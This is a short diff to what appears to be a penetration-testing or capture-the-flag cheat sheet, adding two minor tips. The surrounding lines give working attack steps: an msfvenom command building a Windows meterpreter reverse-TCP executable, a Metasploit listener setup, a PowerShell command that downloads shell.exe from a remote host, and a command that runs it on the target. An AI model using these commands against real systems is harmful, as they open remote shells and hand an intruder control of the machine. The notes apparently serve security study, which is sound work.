@@ -3,6 +3,7 @@
 
 - **Msfvenom**
   -  `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=5555 -f exe > sh.exe`
+  -  chmod +x
   -  set up metasploit listener
   -  msfconsole
   -  search exploit/multi/handler
@@ -21,3 +22,4 @@
       - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.0.0.10:80/shell.exe', 'shell.exe')"`
   - dir to make sure in there
   - `Start-Process "shell-name.exe"`
+  - if not working CD to C:\Windows\Temp
